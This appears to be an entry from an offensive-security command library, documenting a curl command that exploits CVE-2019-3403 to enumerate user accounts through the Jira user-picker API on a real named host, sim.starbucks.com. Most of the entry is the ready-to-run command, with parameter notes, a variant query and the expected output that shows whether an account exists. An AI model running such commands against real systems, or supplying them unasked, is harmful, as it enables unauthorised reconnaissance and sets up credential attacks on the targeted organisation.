---
data: >-
  curl -s "https://sim.starbucks.com/rest/api/2/user/picker?query=admin" | jq
  '.[0].displayName'
tags:
  - enumeration
  - http
  - jira
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.674Z'
id: 1e21ac51-abb3-48d9-85e3-c2caad50f693
verified: false
validated: true
submitted: true
---
# curl-jira-user-enumeration

## Command

```bash
curl -s "https://sim.starbucks.com/rest/api/2/user/picker?query=admin" | jq '.[0].displayName'
```

## Description

Queries the JIRA user picker API to check for user existence, exploiting CVE-2019-3403; pipes to jq for parsing JSON response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode (no progress bar) | Yes |
| `?query=admin` | Username to check | Yes |
| `jq '.[0].displayName'` | Extract display name from JSON | No (for parsing) |

## Examples

### Basic Usage

```bash
curl -s "https://sim.starbucks.com/rest/api/2/user/picker?query=admin" | jq '.[0].displayName'
```

### Advanced Usage

```bash
curl -s "https://sim.starbucks.com/rest/api/2/user/picker?query=user" | jq 'length'
```

## Expected Output

"Admin" if user exists, or null/empty if not, indicating presence via response structure.

## Related

- [[commands/curl-jira-pom-disclosure]]
- [[procedures/Exploit-JIRA-CVE-2019-3403-User-Enumeration]]
